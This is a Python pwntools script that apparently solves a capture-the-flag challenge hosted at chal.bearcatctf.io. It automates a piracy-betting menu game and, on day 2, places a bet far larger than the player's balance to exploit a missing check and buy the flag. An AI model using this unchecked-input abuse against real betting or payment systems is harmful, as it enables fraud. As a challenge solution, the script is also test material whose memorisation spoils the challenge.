#!/usr/bin/env python3
from pwn import *
import re

HOST = "chal.bearcatctf.io"
PORT = 22723

context.update(os="linux", arch="amd64")

MENU_RE = re.compile(rb"It is day\s+(\d+)\s+and you have\s+([0-9]+\.[0-9]+)\s+dollars", re.I)


def recv_menu(io):
    data = io.recvuntil(b"5) Quit\n > ")
    m = MENU_RE.search(data)
    if not m:
        raise RuntimeError(f"could not parse menu: {data!r}")
    return int(m.group(1)), float(m.group(2))


def choose(io, n):
    io.sendline(str(n).encode())


def complete_day(io):
    choose(io, 3)


def place_overbet(io, group=1, amount=3_000_000.0):
    choose(io, 1)
    io.recvuntil(b"Which piracy group would you like to bet on?\n")
    io.recvuntil(b" > ")
    io.sendline(str(group).encode())

    io.recvuntil(b"How much would you like to bet?\n > ")
    io.sendline(f"{amount:.2f}".encode())


def buy_flag(io):
    choose(io, 4)


def main():
    io = remote(HOST, PORT)

    while True:
        day, money = recv_menu(io)
        log.info(f"day={day} money={money:.2f}")

        if money >= 5_000_000:
            buy_flag(io)
            io.interactive()
            return

        if day == 1:
            complete_day(io)
        elif day == 2:
            place_overbet(io, group=1, amount=3_000_000.0)
            complete_day(io)
        else:
            complete_day(io)


if __name__ == "__main__":
    main()
